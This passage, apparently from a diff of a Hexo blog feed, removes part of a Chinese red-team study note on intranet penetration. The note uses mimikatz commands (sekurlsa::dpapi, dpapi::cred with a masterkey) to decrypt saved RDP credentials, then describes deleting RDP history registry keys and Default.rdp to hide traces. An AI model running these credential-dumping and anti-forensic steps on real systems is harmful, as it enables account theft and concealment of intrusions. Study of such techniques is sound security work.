-<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">mimikatz sekurlsa::dpapi</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210407141038260.png" alt="image-20210407141038260"></p>
-<blockquote>
-<p>根据我们刚刚的<code>guimasterkey</code>得到<code>MasterKey</code></p>
-</blockquote>
-<ul>
-<li>最后就可以把密码解密了</li>
-</ul>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mimikatz dpapi::cred /<span class="keyword">in</span>:C:\Users\Administrator\AppData\Local\Microsoft\Credentials\<span class="number">7</span>AAD155F4888E9DB9D7FE4C235728F8C /masterkey:<span class="number">2</span>a1142391cf8bdacf5d93d267f0b8c8ebcf2016a37c5da0efe20b45c5a31b4f91cc4f3438af5ce969f3ac42a3d5e70b15e94df927b457a6c1647c2ce96dd4819</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210407142104997.png" alt="image-20210407142104997"></p>
-<h2 id="从注册表中删除RDP连接缓存"><a href="#从注册表中删除RDP连接缓存" class="headerlink" title="从注册表中删除RDP连接缓存"></a>从注册表中删除RDP连接缓存</h2><ul>
-<li>运行(regedit.exe)并到<code>HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client</code> ;</li>
-</ul>
-<blockquote>
-<p>需要删除两个注册表项：<code>默认</code>（存储的最近10个RDP连接记录）和服务器(包含所有用于登陆的RDP服务器和用户名列表)</p>
-</blockquote>
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210407142745267.png" alt="image-20210407142745267"></p>
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210407142834238.png" alt="image-20210407142834238"></p>
-<blockquote>
-<p>为了清除所有RDP连接和保存的用户名历史记录，必须清除服务器注册表项的内容。删除整个Servers然后重新创建。</p>
-</blockquote>
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210407142952206.png" alt="image-20210407142952206"></p>
-<ul>
-<li>最后把默认的RDP连接文件（包含最新的RDP会话信息）删除- <code>Default.rdp</code></li>
-</ul>
-<blockquote>
-<p>默认在Document目录中隐藏起来</p>
-</blockquote>
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210407143207075.png" alt="image-20210407143207075"></p>
-<blockquote>
-<p>删除</p>
-</blockquote>
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210407143445878.png" alt="image-20210407143445878"></p>
-]]></content>
-      <categories>
-        <category>内网学习笔记</category>
-      </categories>
-      <tags>
-        <tag>红队</tag>
-        <tag>学习笔记</tag>
-        <tag>内网渗透</tag>
-        <tag>mstsc</tag>
       </tags>
   </entry>
   <entry>
